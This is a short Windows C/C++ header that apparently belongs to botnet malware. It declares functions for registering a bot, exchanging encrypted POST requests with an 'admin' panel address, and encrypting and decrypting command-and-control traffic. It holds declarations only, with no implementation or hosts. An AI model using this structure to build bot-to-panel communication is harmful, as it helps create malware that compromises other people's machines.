#pragma once
#include <Windows.h>
bool bot_reg(wchar_t* req);
bool post_send_recv_bot(wchar_t* admin_addr, wchar_t* path_to_admin,
	wchar_t* post_recv, BYTE* decServerResponse);
uint8_t* gen_data_to_send(uint8_t* to_enc_data, uint32_t size_enc_data);
bool decrypt_recv_data(uint8_t* enc_data, uint32_t size_enc_data, uint8_t* dec_data);